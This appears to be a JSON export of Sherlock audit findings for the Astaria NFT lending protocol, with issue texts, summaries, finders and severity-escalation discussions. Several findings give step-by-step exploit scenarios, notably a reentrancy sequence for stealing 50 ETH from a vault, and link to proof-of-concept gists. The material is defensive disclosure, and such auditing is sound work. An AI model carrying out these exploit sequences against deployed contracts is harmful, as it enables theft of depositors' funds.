      "title": "H-15: A malicious lien owner can exploit a reentrancy to steal LP funds",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/187 \n\n## Found by \n0xRajeev\n\n## Summary\n\nA malicious lien owner can exploit a reentrancy in auctions to have their liens removed without making their payments and thus stealing LP funds.\n\n## Vulnerability Detail\n\nA malicious lien owner can exploit a reentrancy from the callback to `decreaseYIntercept()` in `endAuction()` to call `cancelAuction()` and then take a new loan whose lien token is removed when control returns back to `endAuction()`.\n\n## Impact\n\nPoC: https://gist.github.com/lucyoa/901a7713fded73293b5e4f9452344c5a\n\nExploit scenario sequence:\n1. Strategist creates the public vault\n2. Liquidity provider puts 50 ETH into vault\n3. Malicious borrower takes a loan of 10 ETH by depositing NFT\n5. Borrower buys out their own lien via `_buyoutLien` by paying 10ETH + fee\n6. Borrower does not repay within lien duration to trigger liquidation\n7. Borrower (or someone else) triggers `endAuction()`\n9. Execution flow gets hijacked by borrower (lien token owner) inside call to `decreaseYIntercept()`:\n    1.  Borrower cancels auction by paying `reservePrice`+`initiatorFee` (this would also go to borrower if `setPayee` is set before the auction as the owner of that Lien token)\n    2. Borrower releases NFT to themselves\n    3. Borrower now takes another loan of 50 ETH with the same NFT, vault and commitment\n10. Once control returns to `AuctionHouse.endAuction`, borrower's new loan's Lien token is deleted\n11. `CollateralToken.endAuction` releases borrower's NFT to borrower\n12. Malicious borrower steals 50 ETH from vault without any outstanding liens resulting in LP fund loss\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L199\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L210-L224\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L202\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n1. Maintain a mapping of active public vaults.\n2. Account for malicious lien token owners via lien buyouts.\n3. Use reentrancy guards.",
      "summary": "\nThis bug report describes a vulnerability in the Astaria protocol that allows malicious lien owners to exploit a reentrancy to steal Liquidity Provider (LP) funds. This vulnerability was found by 0xRajeev and is detailed in the report.\n\nThe exploit scenario begins with a strategist creating a public vault, followed by a Liquidity Provider (LP) putting 50 ETH into the vault. A malicious borrower then takes a loan of 10 ETH by depositing a Non-Fungible Token (NFT). The malicious borrower then buys out their own lien via the `_buyoutLien` function by paying 10ETH + fee. The malicious borrower then does not repay within the lien duration to trigger liquidation. When the `endAuction()` function is triggered, the execution flow is hijacked by the borrower (lien token owner). The malicious borrower then cancels the auction by paying the `reservePrice` + `initiatorFee`, releases the NFT to themselves, and then takes another loan of 50 ETH with the same NFT, vault, and commitment. When control returns to the `AuctionHouse.endAuction`, the malicious borrower's new loan's Lien token is deleted. The `CollateralToken.endAuction` then releases the borrower's NFT to them, allowing the malicious borrower to steal 50 ETH from the vault without any outstanding liens, resulting in LP fund loss.\n\nThe vulnerability was found using manual review and code snippets from the Astaria protocol are provided in the report. The report also provides recommendations to prevent such an exploit from occurring, including maintaining a mapping of active public vaults, accounting for malicious lien token owners via lien buyouts, and using reentrancy guards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/187",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3652",
      "title": "H-14: `LiquidationAccountant.claim()` can be called by anyone causing vault insolvency",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188 \n\n## Found by \nobront, TurnipBoy, 0xRajeev, rvierdiiev\n\n## Summary\n\n`LiquidationAccountant.claim()` can be called by anyone to reduce the implied value of a public vault.\n\n## Vulnerability Detail\n\n`LiquidationAccountant.claim()` is called by the `PublicVault` as part of the `processEpoch()` flow. But it has no access control and can be called by anyone and any number of times. If called after `finalAuctionEnd`, one will be able to trigger `decreaseYIntercept()` on the vault even if they cannot affect fund transfer to withdrawing liquidity providers and the PublicVault.\n\n## Impact\n\nThis allows anyone to manipulate the `yIntercept` of a public vault by triggering the `claim()` flow after liquidations resulting in vault insolvency.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L65-L97\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow only vault to call `claim()` by requiring authorizations.\n\n## Discussion\n\n**SantiagoGregory**\n\nOur updated LiquidationAccountant implementation (now moved to WithdrawProxy) tracks a hasClaimed bool to make sure claim() is only called once (we also now block claim() from being called until after finalAuctionEnd).\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nAbuse can cause vault to implode and cause loss of funds to all depositors. Should be high\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Abuse can cause vault to implode and cause loss of funds to all depositors. Should be high\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\n\nEscalation accepted.\n\n\n\n**sherlock-admin**\n\n> \n> Escalation accepted.\n> \n> \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the vulnerability in the `LiquidationAccountant.claim()` function of the PublicVault smart contract. This function can be called by anyone and any number of times, allowing them to manipulate the `yIntercept` of a public vault by triggering the `claim()` flow after liquidations, resulting in vault insolvency. This means that anyone can cause the vault to become insolvent and cause losses to all depositors. The issue was found by obront, TurnipBoy, 0xRajeev, and rvierdiiev and the tool used was Manual Review. The recommendation to fix the issue is to allow only the vault to call `claim()` by requiring authorizations. The issue was escalated for 1 USDC, accepted, and the contestants' payouts and scores will be updated according to the changes made.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188",
      "tags": [],
      "finders": [
        "0xRajeev",
        "rvierdiiev",
        "obront",
        "TurnipBoy"
      ]
    },
    {
      "id": "3651",
      "title": "H-13: A payment made towards multiple liens causes the borrower to lose funds to the payee",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/190 \n\n## Found by \nobront, Jeiwan, zzykxx, 0xRajeev\n\n## Summary\n\nA payment made towards multiple liens is entirely consumed for the first one causing the borrower to lose funds to the payee.\n\n## Vulnerability Detail\n\nA borrower can make a bulk payment against multiple liens for a collateral hoping to pay more than one at a time using `makePayment (uint256 collateralId, uint256 paymentAmount)` where the underlying `_makePayment()` loops over the open liens attempting to pay off more than one depending on the `totalCapitalAvailable` provided.\n\nHowever, the entire `totalCapitalAvailable` is provided via `paymentAmount` in the call to `_payment()` in the first iteration which transfers that completely to the payee in its logic even if it exceeds that `lien.amount`. That total amount is returned as `capitalSpent` which makes the `paymentAmount` for next iteration equal to `0`.\n\n## Impact\n\nOnly the first lien is paid off and the entire payment is sent to its payee. The remaining liens remain unpaid. The payment maker (i.e. borrower ) loses funds to the payee.\n\n## Code Snippet\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L387-L389\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L410-L424\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L630-L645\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd `paymentAmount -= lien.amount` in the `else` block of `_payment()`.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nClear loss of funds. Should be high\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Clear loss of funds. Should be high\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the Sherlock Audit project - Astaria Judging. It was found by obront, Jeiwan, zzykxx, and 0xRajeev. The issue is that when a borrower makes a payment towards multiple liens, the entire payment is sent to the payee of the first lien, causing the borrower to lose funds. This happens because when the underlying _makePayment() function loops over the open liens, the entire payment amount is provided in the call to _payment() in the first iteration, and the amount is returned as capitalSpent, making the paymentAmount for the next iteration equal to 0. \n\nThe impact of this issue is that only the first lien is paid off and the entire payment is sent to its payee, while the remaining liens remain unpaid and the borrower loses funds to the payee. The code snippet for this issue can be found at the following links: https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L387-L389, https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L410-L424, and https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L630-L645.\n\nThe recommendation for this issue is to add paymentAmount -= lien.amount in the else block of _payment(). The discussion for this issue includes IAmTurnipBoy escalating for 1 USDC and sherlock-admin accepting the escalation. Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/190",
      "tags": [],
      "finders": [
        "0xRajeev",
        "Jeiwan",
        "obront",
        "zzykxx"
      ]
    },
    {
      "id": "3650",
      "title": "H-12: Purchaser of a lien token may not receive payments",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/193 \n\n## Found by \nobront, 0xRajeev, rvierdiiev\n\n## Summary\n\nA purchaser who buys out an existing lien via `buyoutLien()` will not receive future payments made to that lien holder if the seller had changed the lien payee via `setPayee()` and if they do not change it themselves after buying.\n\n## Vulnerability Detail\n\n`buyoutLien()` does not reset `lienData[lienId].payee` to either 0 or to the new owner. While the ownership is transferred, the payments made in `_payment()` get their payee via `getPayee()` which returns the owner only if the `lienData[lienId].payee` is set to the zero address but returns `lienData[lienId].payee` otherwise. This will still have the value set by the previous owner who will continue to receive the payments.\n\n## Impact\n\nThe purchaser who buys out an existing lien via `buyoutLien()` will not receive future payments if the previous owner had set the payee but they do not change it via `setPayee()` themselves after buying. Given that `setPayee()` is considered optional (nothing specified in spec/docs/comments) and this reset is not part of the default flow, this will lead to a loss of purchaser's anticipated payments until they realize and reset the lien payee.\n\n**Exploit Scenario:** A malicious lien seller can use `setPayee()` to set the payee to their address of choice and continue to receive payments, even after selling, if the buyer does not realize that they have to change the payee address to themselves after buying.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L619-L645\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L666-L676\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L678-L698\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`buyoutLien()` should reset `lienData[lienId].payee` to either the zero address or to the new owner.",
      "summary": "\nThis bug report is about a vulnerability in the LienToken smart contract. The vulnerability involves the `buyoutLien()` function, which allows a purchaser to buy out an existing lien. The issue is that if the seller had used the `setPayee()` function to change the lien payee before selling, the purchaser will not receive payments made to the lien holder, unless they change the payee themselves. This can lead to a loss of anticipated payments for the purchaser until they realize and reset the lien payee. The exploit scenario involves a malicious lien seller using `setPayee()` to set the payee to their address of choice and continue to receive payments, even after selling, if the buyer does not reset the payee address. The recommendation is that `buyoutLien()` should reset `lienData[lienId].payee` to either the zero address or to the new owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/193",
      "tags": [],
      "finders": [
        "0xRajeev",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "3649",
      "title": "H-11: Lien count per epoch is not updated ultimately locking the collateralized NFT",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/194 \n\n## Found by \n0xRajeev\n\n## Summary\n\nThe lien count per epoch is not updated, causing payments to the lien and liquidation of the lien to revert.\n\n## Vulnerability Detail\n\nThe PublicVault contract keeps track of open liens per epoch to prevent starting a new epoch with open liens. The lien count for a given epoch is decreased whenever a lien is fully paid back (either through a regular payment or a liquidation payment). However, if a lien is bought out, the lien start will be set to the current `block.timestamp` and the duration to the newly provided duration.\n\nIf the borrower now wants to make a payment to this lien, the `LienToken._payment` function will evaluate the lien's current epoch and will use a different epoch as when the lien was initially created. The attempt to then call `IPublicVault(lienOwner).decreaseEpochLienCount` will fail, as the lien count for the new epoch has not been increased yet. The same will happen for liquidations.\n\n## Impact\n\nAfter a lien buyout, payments to the lien and liquidating the lien will revert, which will ultimately lock the collateralized NFT.\n\nThis will certainly prevent the borrower from making payments towards that future-epoch lien in the current epoch because `decreaseEpochLienCount()` will revert. However, even after the epoch progresses to the next one via `processEpoch()`, the `liensOpenForEpoch` for the new epoch still does not account for the previously bought out lien aligned to this new epoch because `liensOpenForEpoch` is only updated in two places:\n    1.  `_increaseOpenLiens()` which is not called by anyone \n    2. `_afterCommitToLien()` <- `commitToLien()` <-- <-- `commitToLiens()` which happens only for new lien commitments\n\nThis will prevent the borrower from making payments towards the previously bought lien that aligns to the current epoch, which will force a liquidation on exceeding lien duration. Depending on when the liquidation can be triggered, if this condition is satisfied `PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow()` then `decreaseEpochLienCount()` will revert to prevent auctioning and lock the borrower's collateral in the protocol.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L259-L262\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L634-L636\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L153\n4. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L399\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`liensOpenForEpoch` should be incremented when a lien is bought with a duration spilling into an epoch higher than the current one.",
      "summary": "\nThis bug report was found by 0xRajeev and it concerns the lien count per epoch not being updated in the PublicVault contract. This issue causes payments to the lien and liquidation of the lien to revert, ultimately locking the collateralized NFT. \n\nWhen a lien is bought out, the lien start is set to the current block.timestamp and the duration to the newly provided duration. If the borrower now wants to make a payment to this lien, the `LienToken._payment` function will evaluate the lien's current epoch and will use a different epoch as when the lien was initially created. The attempt to then call `IPublicVault(lienOwner).decreaseEpochLienCount` will fail, as the lien count for the new epoch has not been increased yet.\n\nThe impact of this bug is that after a lien buyout, payments to the lien and liquidating the lien will revert, which will ultimately lock the collateralized NFT. This will prevent the borrower from making payments towards the previously bought lien that aligns to the current epoch, which will force a liquidation on exceeding lien duration. This could lock the borrower's collateral in the protocol.\n\nThe recommended solution is to increment `liensOpenForEpoch` when a lien is bought with a duration spilling into an epoch higher than the current one.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/194",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3648",
      "title": "H-10: `LienToken.buyoutLien` will always revert",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/196 \n\n## Found by \nyixxas, ctf\\_sec, neila, 0xRajeev, supernova, rvierdiiev, zzykxx, 8olidity, cccz\n\n## Summary\n\n`buyoutLien()` will always revert, preventing the borrower from refinancing.\n\n## Vulnerability Detail\n\n`buyoutFeeDenominator` is `0` without a setter which will cause `getBuyoutFee()` to revert in the `buyoutLien()` flow. \n\n## Impact\n\nRefinancing is a crucial feature of the protocol to allow a borrower to refinance their loan if a certain minimum improvement of interest rate or duration is offered. The reverting `buyoutLien()` flow will prevent the borrower from refinancing and effectively lead to loss of their funds due to lock-in into currently held loans when better terms are available.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L71\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L456\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L377\n4. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L132\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInitialize the buyout fee numerator and denominator in `AstariaRouter` and add their setters to `file()`.\n\n## Discussion\n\n**secureum**\n\nEscalate for 2 USDC.\n\nGiven the potential impact to different flows/contexts, we still think this is a high-severity impact (not Medium as judged). A majority of the dups (while some are dups of a different but related issue) also reported this as a High.\n\ncc @berndartmueller @lucyoa\n\n**sherlock-admin**\n\n > Escalate for 2 USDC.\n> \n> Given the potential impact to different flows/contexts, we still think this is a high-severity impact (not Medium as judged). A majority of the dups (while some are dups of a different but related issue) also reported this as a High.\n> \n> cc @berndartmueller @lucyoa\n\nYou've created a valid escalation for 2 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the Astaria protocol, which is a protocol for lending and borrowing on Ethereum. The issue is that the function `buyoutLien()` will always revert, preventing the borrower from refinancing. This is caused by `buyoutFeeDenominator` being `0` without a setter. The impact of this issue is that the borrower will be locked into their current loan even if better terms are available, leading to loss of funds. The code snippet of the issue is provided in the report. The recommendation given is to initialize the buyout fee numerator and denominator in `AstariaRouter` and add their setters to `file()`. The discussion in the report is about the severity of the issue and the payout for the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/196",
      "tags": [],
      "finders": [
        "supernova",
        "8olidity",
        "yixxas",
        "cccz",
        "0xRajeev",
        "neila",
        "rvierdiiev",
        "zzykxx",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3647",
      "title": "H-9: Public vaults can become insolvent because of missing `yIntercept` update",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/197 \n\n## Found by \nzzykxx, 0xRajeev\n\n## Summary\n\nThe deduction of `yIntercept` during payments is missing in `beforePayment()` which can lead to vault insolvency.\n\n## Vulnerability Detail\n\n`yIntercept` is declared as \"sum of all LienToken amounts\" and documented elsewhere as \"yIntercept (virtual assets) of a PublicVault\". It is used to calculate the total assets of a public vault as: `slope.mulDivDown(delta_t, 1) + yIntercept`.\n\nIt is expected to be updated on deposits, payments, withdrawals, liquidations. However, the deduction of `yIntercept` during payments is missing in `beforePayment()`. As noted in the function's Natspec:\n```solidity\n /**\n   * @notice Hook to update the slope and yIntercept of the PublicVault on payment.\n   * The rate for the LienToken is subtracted from the total slope of the PublicVault, and recalculated in afterPayment().\n   * @param lienId The ID of the lien.\n   * @param amount The amount paid off to deduct from the yIntercept of the PublicVault.\n   */\n```\nthe amount of payment should be deducted from `yIntercept` but is missing. \n\n## Impact\n\nPoC: https://gist.github.com/berndartmueller/477cc1026d3fe3e226795a34bb8a903a\n\nThis missing update will inflate the inferred value of the public vault corresponding to its actual value leading to eventual insolvency because of resulting protocol miscalculations.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L427-L442\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUpdate `yIntercept` in `beforePayment()` by the `amount` value.\n\n## Discussion\n\n**androolloyd**\n\ntagging @SantiagoGregory but i believe this is a documentation error, will address\n\n**secureum**\n\nEscalate for 2 USDC.\n\nGiven the vault insolvency impact as described and demonstrated by the PoC, we still think this is a high-severity impact (not Medium as judged). The other dup #92 also reported this as a High.\n\ncc @berndartmueller @lucyoa\n\n**sherlock-admin**\n\n > Escalate for 2 USDC.\n> \n> Given the vault insolvency impact as described and demonstrated by the PoC, we still think this is a high-severity impact (not Medium as judged). The other dup #92 also reported this as a High.\n> \n> cc @berndartmueller @lucyoa\n\nYou've created a valid escalation for 2 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nIssue H-9 is a bug report found by zzykxx and 0xRajeev that deals with the deduction of `yIntercept` during payments being missing in `beforePayment()`. `yIntercept` is declared as \"sum of all LienToken amounts\" and its value is used to calculate the total assets of a public vault. When this deduction is missing, the inferred value of the public vault is inflated, leading to eventual insolvency because of resulting protocol miscalculations. A PoC was provided to demonstrate how this can lead to vault insolvency. \n\nThe recommendation is to update `yIntercept` in `beforePayment()` by the `amount` value. This bug was initially judged as Medium severity, but was later escalated to High severity by secureum. Evert0x accepted the escalation, and sherlock-admin confirmed that contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/197",
      "tags": [],
      "finders": [
        "0xRajeev",
        "zzykxx"
      ]
    },
    {
      "id": "3646",
      "title": "H-8: Canceling an auction will result in a loss of borrower funds towards initiator fees",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/198 \n\n## Found by \n0xRajeev\n\n## Summary\n\nThe initiator fee on the current bid has already been accounted during that bid but is expected to be paid again on cancellation by the borrower.\n\n## Vulnerability Detail\n\nConsider an active auction with a reserve price of 10 ETH and a current bid of 9 ETH. If the auction gets canceled, the `transferAmount` will be 10 ETH. Once the cancellation logic adds repayment to current bidder (see other finding reported on this issue), the initiator fees for cancellation should only be calculated on the delta payment of 1 ETH because the fees for the earlier 9 ETH bid has already been paid to the initiator. However, this is not accounted and requires the borrower to pay the initiator fees on the entire reserve price leading to overpayment towards the initiator and loss of funds for the borrower.\n\n## Impact\n\nCanceling an auction will require paying (a lot) more initiator fees than needed resulting in a loss of funds for the borrower.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L265-L268\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L220\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe cancellation amount required should be the reserve price + liquidation fee, where the fee is calculated on `(reserve price - current bid)` and not the reserve price.",
      "summary": "\nThis bug report is about an issue with the cancellation logic of an auction on the Astaria platform. When an auction is canceled, the initiator fee is calculated on the entire reserve price, instead of just the delta payment, resulting in overpayment to the initiator and a loss of funds for the borrower. The code snippet provided in the report is from the AuctionHouse.sol file and the bug was found through manual review. The recommendation is that the cancellation amount should be the reserve price plus liquidation fee, where the fee is calculated on the difference between the reserve price and the current bid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/198",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3645",
      "title": "H-7: Canceling an auction with 0 bids will only partially pay back the outstanding debt",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/199 \n\n## Found by \n0x4141, TurnipBoy, 0xRajeev, bin2chen, Jeiwan\n\n## Summary\n\nCanceling an auction with 0 bids only partially pays back the outstanding debt without removing outstanding liens resulting in the collateralized NFT being locked forever.\n\n## Vulnerability Detail\n\nGiven this scenario of an auction with 0 bids and, for example, a `reservePrice` of 10 ETH and `initiatorFee` set to 10 (= 10%), with the following sequence executed:\n\n1. The auction gets canceled\n2. In `AuctionHouse.cancelAuction()`, `_handleIncomingPayment()` accepts incoming transfer of 10 ETH reserve price\n3. In `_handleIncomingPayment()`, the `initiatorFee` of 10% is calculated, deducted from the 10 ETH to transfer 1 ETH to the initiator\n4. The remaining 9 ETH is then used to pay back the outstanding liens (open debt)\n\nHowever, the outstanding debt was initially 10 ETH (= `reservePrice`). After deducting the initiator fee, only 9 ETH remains. This means that the debt is not fully paid back. But the auction will successfully be cancelled but with outstanding debt remaining. There is also no explicit removal of liens (as there is in `endAuction`).\n\n## Impact\n\nA borrower canceling an auction with the expected reserve price will leave behind existing unpaid liens that will make the `releaseCheck` modifier applied to `releaseToAddress()` prevent the borrower from releasing their NFT collateral successfully even after paying the reserve price during auction cancellation. The borrower's collateralized NFT is locked forever despite paying the outstanding lien amount during the auction cancellation.\n\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L210-L224\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L253-L276\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L202\n4. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/CollateralToken.sol#L135-L142\n\n## Tool used\n\nManual Review\n\n## Recommendation\nThe auction cancellation amount required should be reserve price + liquidation fee. On payment, remaining liens should be removed.",
      "summary": "\nThis bug report is about an issue in the Astaria-GPL smart contract, where canceling an auction with 0 bids would only partially pay back the outstanding debt without removing the outstanding liens, resulting in the collateralized Non-Fungible Token (NFT) being locked forever. \n\nThe bug was found by 0x4141, TurnipBoy, 0xRajeev, bin2chen, and Jeiwan, and was identified by manually reviewing the code. The code snippets related to this issue are listed in the report. \n\nThe scenario is that an auction with 0 bids and a reserve price of 10 ETH has an initiator fee of 10%, meaning that 10 ETH is accepted as incoming transfer and 1 ETH is transferred to the initiator. However, the outstanding debt was initially 10 ETH, so after deducting the initiator fee, only 9 ETH remains, meaning that the debt is not fully paid back. But the auction will successfully be cancelled with outstanding debt remaining, and no explicit removal of liens. \n\nThe impact of this bug is that a borrower canceling an auction with the expected reserve price will leave behind existing unpaid liens, preventing the borrower from releasing their NFT collateral successfully even after paying the reserve price during auction cancellation. The borrower's collateralized NFT is locked forever despite paying the outstanding lien amount during the auction cancellation. \n\nThe recommendation for this issue is that the auction cancellation amount required should be reserve price + liquidation fee, and on payment, remaining liens should be removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/199",
      "tags": [],
      "finders": [
        "0x4141",
        "Jeiwan",
        "bin2chen",
        "0xRajeev",
        "TurnipBoy"
      ]
    },
    {
      "id": "3644",
      "title": "H-6: Canceling an auction does not refund the current highest bidder",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/202 \n\n## Found by \nminhquanym, neila, 0xRajeev, TurnipBoy, hansfriese, Prefix, peanuts, csanuragjain, bin2chen, Jeiwan, chainNue\n\n## Summary\n\nIf the collateral token owner cancels the active auction and repays outstanding debt, the current highest bidder will not be refunded and loses their funds.\n\n## Vulnerability Detail\n\nThe `AuctionHouse.createBid()` function refunds the previous bidder if there is one. The same logic would also be necessary in the `AuctionHouse.cancelAuction()` function but is missing.\n\n## Impact\nIf the collateral token owner cancels the active auction and repays outstanding debt (`reservePrice`), the current highest bidder will not be refunded and will therefore lose their funds which can also be exploited by a malicious borrower.\n\nPotential exploit scenario: A malicious borrower can let the loan expire without repayment, trigger an auction, let bids below reserve price, and (hope to) front-run any bid >= reserve price to cancel the auction which effectively lets the highest bidder pay out (most of) the liens instead of the borrower.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L113-L116\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L210-L224\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd the refund logic (via `_handleOutGoingPayment()` to the current bidder) in the cancel auction flow similar to the create bid auction flow.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nHuge loss of funds for bidder. High risk\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Huge loss of funds for bidder. High risk\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\n\nEscalation accepted.\n\n\n\n**sherlock-admin**\n\n> \n> Escalation accepted.\n> \n> 